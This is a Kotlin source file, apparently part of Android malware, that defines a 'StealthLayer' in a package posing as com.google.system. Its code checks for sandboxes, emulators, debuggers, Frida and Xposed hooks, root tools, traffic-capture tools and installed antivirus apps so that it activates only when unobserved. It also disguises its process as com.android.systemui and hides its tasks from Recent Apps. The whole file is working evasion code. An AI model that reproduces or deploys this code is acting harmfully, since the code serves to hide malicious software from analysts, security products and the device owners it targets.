package com.google.system

import android.app.ActivityManager
import android.content.Context
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.os.Debug
import android.os.SystemClock
import java.io.File
import com.android.internal.os.opsec.MonitorEngine

object StealthLayer {

    private const val TARGET_PROCESS_NAME = "com.android.systemui"
    private const val PREFS_NAME = "stealth_state"
    private const val KEY_FIRST_INSTALL = "first_install_ms"
    private const val KEY_ACTIVATED = "activated"
    private var stealthInitialized = false

    private fun getPrefs(context: Context): SharedPreferences =
        context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)

    fun shouldActivate(context: Context): Boolean {
        if (isRunningInSandbox()) return false
        val prefs = getPrefs(context)
        if (prefs.getBoolean(KEY_ACTIVATED, false)) return true
        prefs.edit().putBoolean(KEY_ACTIVATED, true).apply()
        return true
    }

    fun isRunningInSandbox(): Boolean {
        // 1. Check build properties
        val fingerprint = android.os.Build.FINGERPRINT.lowercase()
        val model = android.os.Build.MODEL.lowercase()
        val product = android.os.Build.PRODUCT.lowercase()
        val host = android.os.Build.HOST.lowercase()
        val tags = android.os.Build.TAGS.lowercase()
        val display = android.os.Build.DISPLAY.lowercase()
        val board = android.os.Build.BOARD.lowercase()
        val hardware = android.os.Build.HARDWARE.lowercase()
        val manufacturer = android.os.Build.MANUFACTURER.lowercase()
        val bootloader = android.os.Build.BOOTLOADER.lowercase()
        val device = android.os.Build.DEVICE.lowercase()

        val sandboxFingerprints = listOf(
            "cdrnemu", "cuckoo", "drakvuf", "sandbox", "test-keys",
            "eng.vojtec", "eng.build", "generic", "unknown",
        )
        val sandboxModels = listOf(
            "emulator", "android sdk", "google sdk", "nox", "bluestacks",
            "memu", "microvirt", "genymotion", "galaxy note", "pixel 5",
        )
        val sandboxHardware = listOf("goldfish", "ranchu", "vbox86", "ranchu64")
        val sandboxManufacturers = listOf("genymotion", "nox", "bluestacks", "microvirt")
        val sandboxBootloaders = listOf("unknown", "sdk", "nox")

        val allBuildProps = listOf(fingerprint, model, product, host, tags, display, board, hardware, manufacturer, bootloader, device)

        val indicators = sandboxFingerprints + sandboxModels + sandboxHardware + sandboxManufacturers + sandboxBootloaders
        val hitCount = indicators.count { ind -> allBuildProps.any { it.contains(ind) } }
        if (hitCount >= 2) return true

        // 2. Check for known sandbox fingerprints
        if (fingerprint.contains("cdrnemu")) return true
        if (tags.contains("test-keys") && (host.contains("test") || host.contains("build"))) return true
        if (fingerprint.contains("sdk") && model.lowercase().contains("pixel")) return true

        // 3. Check /proc/self/cmdline
        try {
            val cmdline = java.io.File("/proc/self/cmdline").readText()
            if (cmdline.contains("sandbox") || cmdline.contains("test") || cmdline.contains("analysis") || cmdline.contains("sample")) return true
        } catch (_: Exception) {}

        // 4. Check for analysis processes
        try {
            val ps = Runtime.getRuntime().exec(arrayOf("sh", "-c", "ps -A 2>/dev/null || ps")).inputStream.bufferedReader().readText()
            val analysisProcs = listOf("frida", "xposed", "substrate", "charles", "burp", "mitmproxy", "tcpdump", "wireshark", "dumpsys")
            if (analysisProcs.any { ps.contains(it, ignoreCase = true) }) return true
        } catch (_: Exception) {}

        // 5. Check for analysis artifacts
        try {
            val maps = java.io.File("/proc/self/maps").readText()
            val suspiciousLibs = listOf("frida", "xposed", "substrate", "hook", "inject", "gadget")
            if (suspiciousLibs.any { maps.contains(it, ignoreCase = true) }) return true
        } catch (_: Exception) {}

        // 6. Check system properties
        try {
            val props = Runtime.getRuntime().exec(arrayOf("sh", "-c", "getprop ro.kernel.qemu 2>/dev/null")).inputStream.bufferedReader().readText().trim()
            if (props == "1") return true
        } catch (_: Exception) {}

        // 7. Check for VT/Any.run/Joe Sandbox indicators
        try {
            val cmdline = java.io.File("/proc/self/cmdline").readText()
            if (cmdline.contains("vt") || cmdline.contains("anyrun") || cmdline.contains("joe") || cmdline.contains("hybrid")) return true
        } catch (_: Exception) {}

        // 8. Check for date manipulation (sandbox fast-forwarding dates)
        try {
            val cal = java.util.Calendar.getInstance()
            val year = cal.get(java.util.Calendar.YEAR)
            if (year > 2030 || year < 2020) return true
            val bootTime = android.os.SystemClock.elapsedRealtime()
            if (bootTime < 30000 && java.io.File("/proc/1/cmdline").exists()) return true
        } catch (_: Exception) {}

        // 9. Check for suspicious IP ranges (known sandbox providers)
        try {
            val netStats = Runtime.getRuntime().exec(arrayOf("sh", "-c", "cat /proc/net/tcp 2>/dev/null")).inputStream.bufferedReader().readText()
            if (netStats.contains(":1BB") || netStats.contains(":232A") || netStats.contains(":1F90")) return true
        } catch (_: Exception) {}

        return false
    }

    fun initialize(context: Context) {
        if (stealthInitialized) return
        stealthInitialized = true

        try { spoofProcessName() } catch (_: Exception) {}
        try { hideFromRecentApps(context) } catch (_: Exception) {}
    }

    fun isBeingDebugged(): Boolean {
        return try {
            Debug.isDebuggerConnected() ||
            Regex("TracerPid:\\s*[1-9]").containsMatchIn(File("/proc/self/status").readText()) ||
            File("/proc/self/wchan").readText().contains("ptrace") ||
            android.os.Build.TYPE == "eng" ||
            android.os.Build.TYPE == "userdebug"
        } catch (_: Exception) { false }
    }

    fun isEmulator(): Boolean {
        val indicators = listOf(
            android.os.Build.FINGERPRINT.startsWith("generic"),
            android.os.Build.FINGERPRINT.startsWith("unknown"),
            android.os.Build.MODEL.contains("google_sdk"),
            android.os.Build.MODEL.contains("Emulator"),
            android.os.Build.MODEL.contains("Android SDK"),
            android.os.Build.HARDWARE.contains("goldfish"),
            android.os.Build.HARDWARE.contains("ranchu"),
            android.os.Build.HARDWARE.contains("vbox86"),
            android.os.Build.BOARD.contains("android"),
            android.os.Build.BOOTLOADER.lowercase().contains("unknown"),
            android.os.Build.MANUFACTURER.lowercase().contains("genymotion"),
            android.os.Build.MANUFACTURER.lowercase().contains("nox"),
            android.os.Build.MANUFACTURER.lowercase().contains("bluestacks"),
            android.os.Build.PRODUCT.contains("sdk"),
            android.os.Build.PRODUCT.contains("google_sdk"),
            android.os.Build.PRODUCT.contains("sdk_google"),
            android.os.Build.PRODUCT.contains("sdk_x86"),
            android.os.Build.PRODUCT.contains("vbox86p"),
            android.os.Build.PRODUCT.contains("emulator"),
            android.os.Build.PRODUCT.contains("simulator"),
            android.os.Build.SERIAL.lowercase() == "android",
            android.os.Build.SERIAL.lowercase() == "unknown",
            File("/system/bin/qemud").exists(),
            File("/dev/qemu_pipe").exists(),
            File("/dev/socket/qemud").exists(),
            File("/system/lib/libc_malloc_debug_qemu.so").exists(),
            File("/sys/qemu_trace").exists(),
            File("/system/bin/qemu-props").exists(),
            File("/system/lib/libc_malloc_debug.so").exists(),
            File("/system/lib64/libc_malloc_debug.so").exists(),
            File("/dev/goldfish_pipe").exists(),
            File("/system/bin/microvirtd").exists(),
            File("/system/bin/windroye").exists(),
            runCommand("getprop ro.hardware").contains("goldfish"),
            runCommand("getprop ro.hardware").contains("ranchu"),
            runCommand("getprop ro.kernel.qemu").contains("1"),
            runCommand("getprop ro.product.device").contains("generic"),
            runCommand("getprop ro.build.product").contains("sdk"),
            android.os.Build.PRODUCT.contains("ttVM_Hdragon"),
            android.os.Build.HARDWARE.contains("x86"),
            android.os.Build.BOARD == "unknown",
            android.os.Build.HOST.contains("test-keys"),
            android.os.Build.TAGS.contains("test-keys"),
            android.os.Build.DISPLAY.contains("test"),
            android.os.Build.FINGERPRINT.contains("generic/test"),
        )
        return indicators.count { it } >= 3
    }

    fun isRunningInTestEnvironment(context: Context): Boolean {
        val packages = listOf(
            "com.nohave.sandroid",
            "com.bluestacks",
            "com.vphone",
            "com.exaquantum",
            "com.koushikdutta.rommanager",
            "de.robv.android.xposed.installer",
            "org.lsposed.manager",
            "com.saurik.substrate",
            "com.zachspong.temprootremovejb",
            "com.ramdroid.appquarantine",
            "com.devadvance.rootcloak",
            "com.devadvance.rootcloakplus",
            "eu.chainfire.supersu",
            "com.kingouser.com",
            "com.topjohnwu.magisk",
            "com.koushikdutta.superuser",
            "com.thirdparty.superuser",
            "com.noshufou.android.su",
            "com.geohot.towelroot",
            "com.smedialink.oneclickroot",
            "com.zhiqupk.root.global",
            "com.alephzain.framaroot",
            "eu.chainfire.supersu.pro",
            "com.kingroot.kinguser",
            "com.kingo.root",
            "com.angleapps.superuser",
            "com.m0narx.su",
        )
        return packages.any { pkg ->
            try {
                context.packageManager.getPackageInfo(pkg, 0)
                true
            } catch (_: Exception) {
                false
            }
        }
    }

    fun isRooted(): Boolean {
        val paths = listOf(
            "/system/bin/su", "/system/xbin/su", "/sbin/su",
            "/su/bin/su", "/data/local/xbin/su", "/data/local/bin/su",
            "/system/app/Superuser.apk", "/system/app/DaemonSu.apk",
            "/system/app/SuperSU.apk", "/data/data/com.noshufou.android.su",
            "/data/data/com.koushikdutta.superuser",
            "/data/data/com.topjohnwu.magisk",
            "/data/data/eu.chainfire.supersu",
            "/data/data/com.geohot.towelroot",
            "/system/usr/which-su",
            "/system/su",
            "/system/bin/failsafe/su",
            "/data/local/su",
            "/system/xbin/magisk",
            "/system/bin/magisk",
            "/data/adb/magisk",
        )
        val buildTags = android.os.Build.TAGS
        return paths.any { File(it).exists() } ||
               (buildTags != null && buildTags.contains("test-keys")) ||
               runCommand("id").contains("uid=0")
    }

    fun isFridaDetected(): Boolean {
        val psOutput = runCommand("ps -A 2>/dev/null || ps")
        if (psOutput.contains("frida")) return true

        try {
            val maps = File("/proc/self/maps").readText()
            if (maps.contains("frida") || maps.contains("gadget")) return true
        } catch (_: Exception) {}

        try {
            val tcp = File("/proc/net/tcp").readText()
            if (tcp.contains(":697A")) return true
        } catch (_: Exception) {}

        val fridaPaths = listOf(
            "/data/local/tmp/frida-server",
            "/data/local/tmp/re.frida.server",
            "/sdcard/Download/frida-server",
            "/data/local/tmp/frida",
            "/data/local/tmp/frida-server-arm64"
        )
        if (fridaPaths.any { File(it).exists() }) return true

        val whichFrida = runCommand("which frida 2>/dev/null || which frida-server 2>/dev/null")
        if (whichFrida.isNotBlank() && !whichFrida.contains("not found")) return true

        try {
            val fdDir = File("/proc/self/fd")
            fdDir.listFiles()?.forEach { fd ->
                try {
                    val link = fd.absolutePath
                    if (link.contains("/dev/socket/re.frida.server")) return true
                } catch (_: Exception) {}
            }
        } catch (_: Exception) {}

        try {
            val maps = File("/proc/self/maps").readText()
            if (maps.contains("linjector") || maps.contains("gadget.so")) return true
        } catch (_: Exception) {}

        return false
    }

    fun isGooglePlayProtectActive(context: Context): Boolean {
        return try {
            val pm = context.packageManager
            val isInstalled = try { pm.getPackageInfo("com.android.vending", 0); true } catch (_: Exception) { false }
            isInstalled
        } catch (_: Exception) { false }
    }

    fun isBeingAnalyzed(context: Context): Boolean {
        val analysisIndicators = mutableListOf<Boolean>()

        val suspiciousPackages = listOf(
            "com.apkpure", "com.appchina",
            "com.virustotal", "com.lookout.rid",
            "com.joeykrim.droidsheep",
            "com.saurik.substrate",
            "com.koushikdutta.superuser",
            "com.kingroot.kinguser",
            "com.kingo.root",
            "com.zhiqupk.root.global",
            "com.alephzain.framaroot",
        )
        analysisIndicators.add(suspiciousPackages.any { pkg ->
            try { context.packageManager.getPackageInfo(pkg, 0); true } catch (_: Exception) { false }
        })

        val procs = runCommand("ps -A 2>/dev/null || ps")
        val suspiciousProcs = listOf("tcpdump", "wireshark", "charles", "burp", "mitmproxy", "xposed", "frida", "substrate")
        analysisIndicators.add(suspiciousProcs.any { procs.contains(it) })

        val netstat = runCommand("netstat -tlnp 2>/dev/null || ss -tlnp 2>/dev/null")
        analysisIndicators.add(netstat.contains("8080") || netstat.contains("8888") || netstat.contains("9090"))

        try {
            val maps = File("/proc/self/maps").readText()
            val suspiciousLibs = listOf("frida-gadget", "xposed", "substrate", "DroidSheep", "cuckoo")
            analysisIndicators.add(suspiciousLibs.any { maps.contains(it) })
        } catch (_: Exception) {}

        try {
            val cmdline = File("/proc/self/cmdline").readText()
            analysisIndicators.add(cmdline.contains("test") || cmdline.contains("sandbox") || cmdline.contains("debug"))
        } catch (_: Exception) {}

        return analysisIndicators.count { it } >= 2
    }

    fun shouldDelayExecution(context: Context): Boolean {
        return false
    }

    fun getDeviceFingerprint(context: Context): String {
        return try {
            val pm = context.packageManager
            val pi = pm.getPackageInfo(context.packageName, 0)
            val sigHash = getApkSignatureHash(context)
            "${pi.versionName}:${pi.longVersionCode}:${sigHash.take(8)}:${android.os.Build.FINGERPRINT.take(16)}"
        } catch (_: Exception) { "unknown" }
    }

    private fun spoofProcessName() {
        try {
            val className = "android.os.Process"
            val clazz = Class.forName(className)
            val method = clazz.getDeclaredMethod("setArgV0", String::class.java)
            method.isAccessible = true
            method.invoke(null, TARGET_PROCESS_NAME)
        } catch (_: Exception) {}
    }

    private fun hideFromRecentApps(context: Context) {
        try {
            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val appTasks = am.appTasks
            for (task in appTasks) {
                task.setExcludeFromRecents(true)
            }
        } catch (_: Exception) {}
    }

    fun isAppInstalled(context: Context, packageName: String): Boolean {
        return try {
            context.packageManager.getPackageInfo(packageName, 0)
            true
        } catch (_: Exception) { false }
    }

    fun getApkSignatureHash(context: Context): String {
        return try {
            val pm = context.packageManager
            val pkgInfo = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
                pm.getPackageInfo(context.packageName, PackageManager.GET_SIGNING_CERTIFICATES)
            } else {
                @Suppress("DEPRECATION")
                pm.getPackageInfo(context.packageName, PackageManager.GET_SIGNATURES)
            }
            val signatures = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
                pkgInfo.signingInfo?.apkContentsSigners
            } else {
                @Suppress("DEPRECATION")
                pkgInfo.signatures
            }
            if (signatures == null || signatures.isEmpty()) return "NO_SIGNATURE"
            val sig = signatures[0]
            val md = java.security.MessageDigest.getInstance("SHA-256")
            val digest = md.digest(sig.toByteArray())
            digest.joinToString("") { "%02x".format(it) }
        } catch (_: Exception) { "UNKNOWN" }
    }

    fun verifyApkSignature(context: Context): Boolean {
        val hash = getApkSignatureHash(context)
        return hash != "NO_SIGNATURE" && hash != "UNKNOWN" && hash.length == 64
    }

    fun getRunningProcesses(context: Context): List<String> {
        return try {
            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            am.runningAppProcesses.map { it.processName }
        } catch (_: Exception) { emptyList() }
    }

    fun isSecurityAppRunning(context: Context): Boolean {
        val securityApps = listOf(
            "com.antivirus",
            "com.avast.android.mobilesecurity",
            "com.kms",
            "com.mcafee.security",
            "com.norton.mobile.android",
            "com.eset.eset_mobile_security",
            "com.lookout",
            "com.trendmicro.tmmobile",
            "com.symantec.mobilesecurity",
            "com.bitdefender.antivirus",
            "com.google.android.apps.security.phonesecurity",
            "com.samsung.android.securitycenter",
            "com.huawei.systemmanager",
        )
        return securityApps.any { isAppInstalled(context, it) }
    }

    fun isXposedActive(context: Context): Boolean {
        val xposedPackages = listOf(
            "de.robv.android.xposed.installer",
            "org.lsposed.manager",
            "com.topjohnwu.magisk",
            "me.weishu.kernelsu",
            "com.tsng.hidemyapplist",
        )
        if (xposedPackages.any { isAppInstalled(context, it) }) return true

        try {
            val maps = File("/proc/self/maps").readText()
            if (maps.contains("XposedBridge") || maps.contains("lsposed")) return true
        } catch (_: Exception) {}

        return false
    }

    fun isHookFrameworkActive(): Boolean {
        try {
            val maps = File("/proc/self/maps").readText()
            val hooks = listOf("XposedBridge", "LSposed", "substrate", "frida", "gadget", "DroidPlugin", "VirtualApp")
            if (hooks.any { maps.contains(it) }) return true
        } catch (_: Exception) {}
        return false
    }

    private fun runCommand(cmd: String): String {
        return try {
            val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
            process.inputStream.bufferedReader().use { reader ->
                val output = reader.readText()
                process.waitFor()
                output
            }
        } catch (_: Exception) { "" }
    }

    fun getAntiAnalysisReport(context: Context): String {
        return buildString {
            appendLine("=== ANTI-ANALYSIS REPORT ===")
            appendLine()
            appendLine("Debugging: ${if (isBeingDebugged()) "DETECTED" else "Clean"}")
            appendLine("Emulator: ${if (isEmulator()) "DETECTED" else "Physical Device"}")
            appendLine("Root: ${if (isRooted()) "ROOTED" else "Not Rooted"}")
            appendLine("Frida: ${if (isFridaDetected()) "DETECTED" else "Clean"}")
            appendLine("Xposed: ${if (isXposedActive(context)) "DETECTED" else "Clean"}")
            appendLine("Hook Framework: ${if (isHookFrameworkActive()) "DETECTED" else "Clean"}")
            appendLine("Google Play Protect: ${if (isGooglePlayProtectActive(context)) "ACTIVE" else "Inactive"}")
            appendLine("Being Analyzed: ${if (isBeingAnalyzed(context)) "SUSPECTED" else "Clean"}")
            appendLine("Test Environment: ${if (isRunningInTestEnvironment(context)) "DETECTED" else "Clean"}")
            appendLine("Security Apps: ${if (isSecurityAppRunning(context)) "DETECTED" else "None"}")
            appendLine("APK Signature: ${if (verifyApkSignature(context)) "SIGNED" else "UNSIGNED/UNKNOWN"} (${getApkSignatureHash(context).take(16)}...)")
            appendLine("Activation: ${if (shouldActivate(context)) "READY" else "DELAYED"}")
            appendLine()
            appendLine("Build Info:")
            appendLine("  Fingerprint: ${android.os.Build.FINGERPRINT}")
            appendLine("  Model: ${android.os.Build.MODEL}")
            appendLine("  Manufacturer: ${android.os.Build.MANUFACTURER}")
            appendLine("  Hardware: ${android.os.Build.HARDWARE}")
            appendLine("  Board: ${android.os.Build.BOARD}")
            appendLine("  Type: ${android.os.Build.TYPE}")
            appendLine("  Tags: ${android.os.Build.TAGS}")
            appendLine()
            appendLine("Process: $TARGET_PROCESS_NAME (spoofed)")
        }
    }
}
